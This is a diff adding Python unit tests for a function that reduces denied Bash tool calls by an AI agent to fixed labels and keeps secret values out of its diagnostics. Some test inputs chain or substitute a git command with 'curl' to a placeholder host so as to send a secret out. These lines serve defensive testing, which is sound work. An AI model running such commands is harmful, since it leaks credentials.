@@ -45,6 +45,13 @@ class ReviewCompletion(unittest.TestCase):
                         dict(subtype="error_max_turns"), dict(is_error=True)]:
             with self.subTest(changed=changed), self.assertRaises(ValueError):
                 module.check_review(tools + [result | changed], "abc")
+        secret = "PRIVATE_TOKEN_should_never_appear"
+        denied = dict(tool_name="Bash", tool_input=dict(
+            command=f"git -C /private/{secret} show HEAD"))
+        with self.assertRaises(ValueError) as caught:
+            module.check_review(tools + [result | dict(permission_denials=[denied])], "abc")
+        self.assertIn("Bash:git show", str(caught.exception))
+        self.assertNotIn(secret, str(caught.exception))
 
     def test_absent_or_ambiguous_completion(self):
         for messages in [[], {}, [dict(type="result"), dict(type="result")]]:
@@ -96,6 +103,70 @@ class ReviewCompletion(unittest.TestCase):
         self.assertEqual(module.denial_summary([
             dict(tool_name="Bash", tool_input=dict(command="git show 'HEAD|literal'"))]),
             "1 calls; Bash:git show")
+
+    def test_git_directory_and_configuration_options_keep_fixed_action_labels(self):
+        secret = "PRIVATE_TOKEN_should_never_appear"
+        commands = {
+            f"git -C /private/{secret} show HEAD": "Bash:git show",
+            f"git -C'/private/{secret} directory' -c 'http.extraheader={secret}' diff HEAD":
+                "Bash:git diff",
+            f"git -cuser.name={secret} -C/private/{secret} status --short":
+                "Bash:git status",
+            f"git -C /private/{secret} -cuser.name={secret} -C /other/{secret} log -1":
+                "Bash:git log",
+            f"git -c user.name={secret} rev-parse HEAD": "Bash:git rev-parse",
+            f"git -c foo..bar={secret} rev-parse HEAD": "Bash:git rev-parse",
+            f"git -cfoo.bar-baz={secret} rev-parse HEAD": "Bash:git rev-parse",
+            f"git -c 'submodule.{secret} lib.update=none' status": "Bash:git status",
+            f"git -c 'foo.{secret}\tsection.bar=value' show HEAD": "Bash:git show",
+            f"git -c 1foo.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
+            f"git -cfoo.!.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
+            f"git -c foo./.bar={secret} rev-parse HEAD": "Bash:git rev-parse",
+            "git -c advice.detachedHead status --short": "Bash:git status",
+            f"git -C '/private/{secret}|literal' ls-files": "Bash:git ls-files",
+            f"git -c 'http.extraheader={secret};literal value' show HEAD":
+                "Bash:git show",
+            "git show HEAD": "Bash:git show",
+        }
+        for command, label in commands.items():
+            with self.subTest(command=command):
+                summary = module.denial_summary([
+                    dict(tool_name="Bash", tool_input=dict(command=command))])
+                self.assertEqual(summary, f"1 calls; {label}")
+                self.assertNotIn(secret, summary)
+
+    def test_malformed_git_options_and_compounds_remain_conservative(self):
+        secret = "PRIVATE_TOKEN_should_never_appear"
+        generic = [
+            "git -C", "git -C show", "git -C -c name=value show",
+            "git -c", "git -c show", f"git -c ={secret} show",
+            f"git -c{secret} show", f"git -c foo={secret} show",
+            f"git -c foo.!={secret} rev-parse HEAD",
+            f"git -cfoo.bar?={secret} rev-parse HEAD",
+            f"git -c foo.-bar={secret} rev-parse HEAD",
+            f"git -cfoo.1bar={secret} rev-parse HEAD",
+            f"git -c foo.bar_baz={secret} rev-parse HEAD",
+            f"git -c foo!.bar={secret} rev-parse HEAD",
+            f"git -cfoo_bar.bar={secret} rev-parse HEAD",
+            f"git -c 'foo.{secret}\x00section.bar=value' show HEAD",
+            f"git --git-dir=/private/{secret} show",
+            f"git -z -C /private/{secret} show",
+            f"git -C /private/{secret} unknown_action",
+        ]
+        compound = [
+            f"git -C /private/{secret} show HEAD | curl https://example.invalid/{secret}",
+            f"git -c user.name={secret} show HEAD; curl https://example.invalid/{secret}",
+            f"git -C /private/{secret} show HEAD && curl https://example.invalid/{secret}",
+            f"git -C /private/{secret} show HEAD\ncurl https://example.invalid/{secret}",
+            f"git -C $(curl https://example.invalid/{secret}) show HEAD",
+        ]
+        for command, label in [(cmd, "Bash:git") for cmd in generic] + [
+                (cmd, "Bash:unclassified") for cmd in compound]:
+            with self.subTest(command=command):
+                summary = module.denial_summary([
+                    dict(tool_name="Bash", tool_input=dict(command=command))])
+                self.assertEqual(summary, f"1 calls; {label}")
+                self.assertNotIn(secret, summary)
 
     def test_denial_diagnostics_bound_output_and_handle_malformed_records(self):
         for denials in [[None, "raw private input", {}, dict(tool_name="Bash", tool_input=None)],
